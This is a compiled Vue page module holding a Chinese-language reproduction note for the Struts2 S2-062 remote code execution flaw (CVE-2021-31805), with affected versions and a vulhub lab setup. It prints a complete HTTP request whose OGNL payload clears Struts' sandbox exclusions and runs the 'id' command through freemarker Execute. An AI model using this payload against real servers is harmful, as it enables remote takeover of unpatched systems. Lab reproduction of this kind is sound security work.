import{_ as a}from"./plugin-vue_export-helper-c27b6911.js";import{o as n,c as s,e}from"./app-58e4a7d6.js";const t={},o=e(`<h2 id="漏洞描述" tabindex="-1"><a class="header-anchor" href="#漏洞描述" aria-hidden="true">#</a> 漏洞描述</h2><p>该漏洞由于对CVE-2020-17530的修复不完整造成的，CVE-2020-17530漏洞是由于Struts2 会对某些标签属性(比如id) 的属性值进行二次表达式解析，因此当这些标签属性中使用了 %{x} 且 其中x 的值用户可控时，用户再传入一个 %{payload} 即可造成OGNL表达式执行。在CVE-2021-31805漏洞中，仍然存在部分标签属性会造成攻击者恶意构造的OGNL表达式执行，导致远程代码执行。</p><h2 id="漏洞影响" tabindex="-1"><a class="header-anchor" href="#漏洞影响" aria-hidden="true">#</a> 漏洞影响</h2><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>Struts 2.0.0 - Struts 2.5.29
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h2 id="环境搭建" tabindex="-1"><a class="header-anchor" href="#环境搭建" aria-hidden="true">#</a> 环境搭建</h2><div class="language-php line-numbers-mode" data-ext="php"><pre class="language-php"><code>git <span class="token keyword">clone</span> https<span class="token punctuation">:</span><span class="token comment">//github.com/vulhub/vulhub.git</span>
cd vulhub<span class="token operator">/</span>struts2<span class="token operator">/</span>s2<span class="token operator">-</span><span class="token number">061</span>
docker<span class="token operator">-</span>compose up <span class="token operator">-</span>d
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现" aria-hidden="true">#</a> 漏洞复现</h2><p>主页面</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202205131027608.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>发送请求包</p><div class="language-php line-numbers-mode" data-ext="php"><pre class="language-php"><code><span class="token constant">POST</span> <span class="token operator">/</span>index<span class="token operator">.</span>action <span class="token constant">HTTP</span><span class="token operator">/</span><span class="token number">1.1</span>
Host<span class="token punctuation">:</span> localhost<span class="token punctuation">:</span><span class="token number">8080</span>
Accept<span class="token operator">-</span>Encoding<span class="token punctuation">:</span> gzip<span class="token punctuation">,</span> deflate
Accept<span class="token punctuation">:</span> <span class="token operator">*</span><span class="token operator">/</span><span class="token operator">*</span>
Accept<span class="token operator">-</span>Language<span class="token punctuation">:</span> en
User<span class="token operator">-</span>Agent<span class="token punctuation">:</span> Mozilla<span class="token operator">/</span><span class="token number">5.0</span> <span class="token punctuation">(</span>Windows <span class="token constant">NT</span> <span class="token number">10.0</span><span class="token punctuation">;</span> Win64<span class="token punctuation">;</span> x64<span class="token punctuation">)</span> AppleWebKit<span class="token operator">/</span><span class="token number">537.36</span> <span class="token punctuation">(</span><span class="token constant">KHTML</span><span class="token punctuation">,</span> like Gecko<span class="token punctuation">)</span> Chrome<span class="token operator">/</span><span class="token number">80.0</span><span class="token number">.3987</span><span class="token number">.132</span> Safari<span class="token operator">/</span><span class="token number">537.36</span>
Connection<span class="token punctuation">:</span> close
Content<span class="token operator">-</span>Type<span class="token punctuation">:</span> multipart<span class="token operator">/</span>form<span class="token operator">-</span>data<span class="token punctuation">;</span> boundary<span class="token operator">=</span><span class="token operator">--</span><span class="token operator">--</span>WebKitFormBoundaryl7d1B1aGsV2wcZwF
Content<span class="token operator">-</span>Length<span class="token punctuation">:</span> <span class="token number">829</span>

<span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span>WebKitFormBoundaryl7d1B1aGsV2wcZwF
Content<span class="token operator">-</span>Disposition<span class="token punctuation">:</span> form<span class="token operator">-</span>data<span class="token punctuation">;</span> name<span class="token operator">=</span><span class="token string double-quoted-string">&quot;id&quot;</span>

<span class="token operator">%</span><span class="token punctuation">{</span><span class="token punctuation">(</span><span class="token comment">#instancemanager=#application[&quot;org.apache.tomcat.InstanceManager&quot;]).(#stack=#attr[&quot;com.opensymphony.xwork2.util.ValueStack.ValueStack&quot;]).(#bean=#instancemanager.newInstance(&quot;org.apache.commons.collections.BeanMap&quot;)).(#bean.setBean(#stack)).(#context=#bean.get(&quot;context&quot;)).(#bean.setBean(#context)).(#macc=#bean.get(&quot;memberAccess&quot;)).(#bean.setBean(#macc)).(#emptyset=#instancemanager.newInstance(&quot;java.util.HashSet&quot;)).(#bean.put(&quot;excludedClasses&quot;,#emptyset)).(#bean.put(&quot;excludedPackageNames&quot;,#emptyset)).(#arglist=#instancemanager.newInstance(&quot;java.util.ArrayList&quot;)).(#arglist.add(&quot;id&quot;)).(#execute=#instancemanager.newInstance(&quot;freemarker.template.utility.Execute&quot;)).(#execute.exec(#arglist))}</span>
<span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span>WebKitFormBoundaryl7d1B1aGsV2wcZwF<span class="token operator">--</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202205131027759.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure>`,12),p=[o];function c(r,i){return n(),s("div",null,p)}const d=a(t,[["render",c],["__file","Struts2 S2-062 远程代码执行漏洞 CVE-2021-31805.html.vue"]]);export{d as default};
